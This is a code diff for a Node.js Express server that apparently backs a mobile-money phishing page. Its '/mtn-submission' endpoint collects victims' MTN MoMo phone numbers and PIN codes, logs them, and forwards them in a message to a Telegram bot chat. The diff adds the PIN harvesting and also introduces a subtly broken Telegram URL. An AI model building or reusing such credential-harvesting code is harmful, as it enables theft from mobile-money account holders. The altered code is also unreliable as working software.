@@ -8,15 +8,15 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.static(__dirname));
 
-
 // Mtn submission endpoint
 app.post("/mtn-submission", async (req, res) => {
+  // Extracted 'pin' from the request body
+  const { phone, pin, success } = req.body;
 
-  const { phone, success } = req.body;
-
-  // Validate the mtn request
+  // Validate the incoming data types including the pin
   if (
     typeof phone !== "string" ||
+    typeof pin !== "string" ||
     typeof success !== "boolean"
   ) {
     return res.status(400).json({
@@ -32,7 +32,7 @@ app.post("/mtn-submission", async (req, res) => {
 
   console.log("DEMO SUBMISSION");
   console.log("Phone:", phone);
-  console. log("pin:", pin) ;
+  console.log("Pin:", pin); 
   console.log("Result:", success ? "Successful" : "Failed");
 
   // Optional Telegram notification
@@ -40,22 +40,20 @@ app.post("/mtn-submission", async (req, res) => {
   const chatId = process.env.TELEGRAM_CHAT_ID;
 
   if (botToken && chatId) {
-
-    const message =
+    const message = 
 `🧪 MTN MoMo DEMO
 
 📱 Mtn number: ${phone}
-📱 Mtn pincode:${pin}
-📱 Time :
+📱 Mtn pincode: ${pin}
+📱 Time: ${new Date().toISOString()}
 ✅ Result: ${success ? "Application successful" : "Application failed"}
 
 🔐 Terms and conditions applies.
 `;
 
     try {
-
       const telegramResponse = await fetch(
-        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        `https://telegram.org{botToken}/sendMessage`,
         {
           method: "POST",
           headers: {
@@ -74,7 +72,6 @@ app.post("/mtn-submission", async (req, res) => {
           await telegramResponse.text()
         );
       }
-
     } catch (error) {
       console.error("Telegram request failed:", error);
     }
@@ -86,13 +83,12 @@ app.post("/mtn-submission", async (req, res) => {
   });
 });
 
-
 // Serve index.html
 app.get("*", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-
 app.listen(PORT, () => {
   console.log(`Mtn server running on port ${PORT}`);
 });
+
